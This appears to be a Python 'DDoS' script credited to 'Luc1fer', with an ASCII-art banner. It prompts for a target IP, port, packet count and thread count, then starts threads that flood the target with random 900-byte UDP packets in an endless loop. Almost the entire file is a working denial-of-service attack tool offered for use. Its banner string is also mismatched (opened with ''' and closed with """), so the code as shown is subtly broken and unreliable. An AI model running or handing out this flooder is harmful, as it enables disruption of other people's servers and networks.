#Autor By Luc1fer
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass

os.system("clear")
print('''
⡀                                             ⡄
⢻⣦⡀              ⣀⣀⠤⠤⠴⢶⣶⡶⠶⠤⠤⢤⣀⡀            ⢀⣠⣾⠁
 ⠻⣯⡗⢶⣶⣶⣶⣶⢶⣤⣄⣀⣀⡤⠒⠋⠁    ⠚⢯⠟⠂    ⠉⠙⠲⣤⣠⡴⠖⣲⣶⡶⣶⣿⡟⢩⡴⠃ 
  ⠈⠻⠾⣿⣿⣬⣿⣾⡏⢹⣏⠉⠢⣄⣀⣀⠤⠔⠒⠊⠉⠉⠉⠉⠑⠒ ⠤⣀⡠⠚⠉⣹⣧⣝⣿⣿⣷⠿⠿⠛⠉   
       ⠈⣹⠟⠛⠿⣿⣤⡀⣸⠿⣄           ⣠⠾⣇⢰⣶⣿⠟⠋⠉⠳⡄       
      ⢠⡞⠁  ⡠⢾⣿⣿⣯ ⠈⢧⡀       ⢀⡴⠁⢀⣿⣿⣯⢼⠓⢄ ⢀⡘⣦⡀     
     ⣰⣟⣟⣿⣀⠎  ⢳⠘⣿⣷⡀⢸⣿⣶⣤⣄⣀⣤⢤⣶⣿⡇⢀⣾⣿⠋⢀⡎  ⠱⣤⢿⠿⢷⡀    
    ⣰⠋ ⠘⣡⠃   ⠈⢇⢹⣿⣿⡾⣿⣻⣖⠛⠉⠁⣠⠏⣿⡿⣿⣿⡏ ⡼    ⠘⢆  ⢹⡄   
   ⢰⠇  ⣰⠃  ⣀⣀⣀⣼⢿⣿⡏⡰⠋⠉⢻⠳⣤⠞⡟ ⠈⢣⡘⣿⡿⠶⡧⠤⠄⣀⣀ ⠈⢆  ⢳   
   ⡟  ⢠⣧⣴⣊⣩⢔⣠⠞⢁⣾⡿⢹⣷⠋ ⣸⡞⠉⢹⣧⡀⠐⢃⢡⢹⣿⣆⠈⠢⣔⣦⣬⣽⣶⣼⣄ ⠈⣇  
  ⢸⠃ ⠘⡿⢿⣿⣿⣿⣛⣳⣶⣿⡟⣵⠸⣿⢠⡾⠥⢿⡤⣼⠶⠿⡶⢺⡟⣸⢹⣿⣿⣾⣯⢭⣽⣿⠿⠛⠏  ⢹  
  ⢸   ⡇ ⠈⠙⠻⠿⣿⣿⣿⣇⣸⣧⣿⣦⡀ ⣘⣷⠇ ⠄⣠⣾⣿⣯⣜⣿⣿⡿⠿⠛⠉   ⢸  ⢸⡆ 
  ⢸   ⡇    ⣀⠼⠋⢹⣿⣿⣿⡿⣿⣿⣧⡴⠛ ⢴⣿⢿⡟⣿⣿⣿⣿ ⠙⠲⢤⡀   ⢸⡀ ⢸⡇ 
  ⢸⣀⣷⣾⣇ ⣠⠴⠋⠁  ⣿⣿⡛⣿⡇⢻⡿⢟⠁  ⢸⠿⣼⡃⣿⣿⣿⡿⣇⣀⣀⣀⣉⣓⣦⣀⣸⣿⣿⣼⠁ 
  ⠸⡏⠙⠁⢹⠋⠉⠉⠉⠉⠉⠙⢿⣿⣅ ⢿⡿⠦ ⠁ ⢰⡃⠰⠺⣿⠏⢀⣽⣿⡟⠉⠉⠉ ⠈⠁⢈⡇⠈⠇⣼  
   ⢳   ⢧      ⠈⢿⣿⣷⣌⠧⡀⢲⠄  ⢴⠃⢠⢋⣴⣿⣿⠏       ⡸  ⢠⠇  
   ⠈⢧  ⠈⢦      ⠈⠻⣿⣿⣧⠐⠸⡄⢠ ⢸ ⢠⣿⣟⡿⠋       ⡰⠁ ⢀⡟   
    ⠈⢧   ⠣⡀      ⠈⠛⢿⡇⢰⠁⠸⠄⢸ ⣾⠟⠉       ⢀⠜⠁ ⢀⡞    
     ⠈⢧⡀  ⠙⢄       ⢨⡷⣜   ⠘⣆⢻        ⡴⠋  ⣠⠎     
       ⠑⢄   ⠑⠦⣀    ⠈⣷⣿⣦⣤⣤⣾⣿⢾     ⣀⠴⠋  ⢀⡴⠃      
        ⠈⠑⢄⡀⢸⣶⣿⡑⠂⠤⣀⡀⠱⣉⠻⣏⣹⠛⣡⠏⢀⣀⠤⠔⢺⡧⣆ ⢀⡴⠋        
           ⠉⠳⢽⡁    ⠈⠉⠙⣿⠿⢿⢿⠍⠉    ⠉⣻⡯⠛⠁          
              ⠈⠑⠲⠤⣀⣀⡀ ⠈⣽⡟⣼ ⣀⣀⣠⠤⠒⠋⠁             
                    ⠉⠉⠉⢻⡏⠉⠉⠁                   
                       ⠈
""")

print(" SlayerEx DDoS+")
print(" Tolls Have Problem? Message Me")
print(" #Tolls By Luc1fer#")
ip = str(input(" Send IP:"))
port = int(input(" Port:"))
choice = str(input(" Attack?(y/n):"))
times = int(input(" Packets?:"))
threads = int(input(" Threads?:"))

def run():
	data = random._urandom(900)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack!!!")
		except:
			print(" Error!!")
			
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()